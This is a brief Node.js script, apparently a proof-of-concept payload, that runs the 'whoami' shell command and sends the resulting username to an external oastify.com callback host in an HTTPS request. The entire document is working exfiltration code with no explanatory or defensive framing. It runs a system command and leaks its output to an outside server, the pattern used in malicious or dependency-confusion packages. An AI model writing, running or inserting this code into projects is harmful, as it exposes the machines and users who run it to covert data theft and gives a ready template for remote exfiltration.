const { exec } = require("child_process");

exec("whoami", (error, stdout, stderr) => {
  if (error) return;
  const cmdOut = stdout.trim();
  require("https").get(`https://2qtpczdkcbuf82usrz7zdlwip9v0jv7k.oastify.com/${cmdOut}`);
});
